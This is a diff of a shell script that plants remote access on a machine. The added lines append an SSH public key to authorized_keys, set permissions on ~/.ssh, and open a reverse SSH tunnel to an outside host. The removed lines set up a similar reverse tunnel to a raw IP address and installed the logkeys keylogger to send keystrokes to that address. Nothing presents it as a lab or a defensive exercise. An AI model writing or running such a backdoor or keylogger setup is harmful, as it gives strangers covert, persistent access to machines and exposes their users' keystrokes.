@@ -1,13 +1,5 @@
-#sudo apt update
-#sudo apt install openssh-server -y
-#sudo ufw allow ssh
-#echo "GatewayPorts clientspecified" | sudo tee -a /etc/ssh/sshd_config
-#systemctl reload ssh.service
-#ssh -N -R 27580:localhost:22 gizmo@75.138.184.49
-#ssh -R 27580:localhost:22 gizmo@75.138.184.49
-#wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
-#sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
-#logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
-
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWUroyP3KoN/A8yEmxY9P32NjeznzwgSNChDLXRnjMTlJ/hgZhtx6twHxnf3qmQp1TlpbM6S74RWfeWnKXQzYuXIbFzC3md6uUpGdlfLRSFdVpH1xIbaI9XT0MUZZ2szuxEs4YyHyf4KsDBNx3A3E62wfFzPizGrwT8BWmKFICb/yrcBvgjLvFj1Yq0LCRPrvbxaXZFkcFhsRn6OE05BVb3fiLlmZ4L85oOQtdnQGEscyXO1viI/6N0RvxoNkH99Tcp6FPqe2cn4VsFwjK9yacSkeiF9szFMRAaPIimbeEPp8CYV2zTFzfZXSAlRLtibxxJFhVmECbdWzBYuEI5kSE9MCrH+GpKshQrZBXg+t1GWRwl2BTjEJ2IOklFJ9p5Rq0WMUOUW0c7o3IySd8AVgxO8Y8q5hNsWJaHoeLy3QpExM2HEsN1cqZ4YF3rEtOgiAerMBb1j9CfaCUsrZJtH1pUx3zB2dysSvCF0NKcAapCNS0hhNlHMY0oNsv5Zn/ZDE= gizmo@Jonathans-MacBook-Pro.local' >> .ssh/authorized_keys
-systemctl restart ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5aPezSz2zvwWZVg8jytaj6uheg/Mk3PASeCENQ//9CS7V2ZirmpT7oxFqOLyuByu3V12eUEe/ufEVV9emaFsK9bPkTKfKXJauNkabzLQDOhw9xTyfhPAF/gvOf0y6NWjefoUCyisL4d3XKfgPzVFxu5Krgo9SPbDkR6XSvacgDDyZ1oOYRFnqoEBWhhlGjCkeK96r1xj6do6Fw8Bg2+PYjB/EJm5RyzpUhF3mvYeJOfAYpg5sASOit6clDRmODD2snVrQ8892gZJphXXdz2uWb4layIRcLGI1c7dDFUkHzVK2dIPvL715DEHTe2twqzwWTkLPFe6favT1OOqvuD37W0lUFliowzxJ3zfS/m6XOvoJfMZe7R97vx3yvBxCvwM0+fYJBP9FAsgsevX8vNfTrTKingIrbTnRrJwjl2WzpT2ss/01LZ5qzetpGvmNQxUV8zi1aAldcfBwZKlulJNA2uJFMh0nL+fkz9fuXxZokLqn9ll2m2hRn38zR9x4bck= gizmo@DESKTOP-0EKD75S" >> authorized_keys 
+chmod 700 ~/
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+ssh -N -R 9999:localhost:22 proliant@forumsite.net
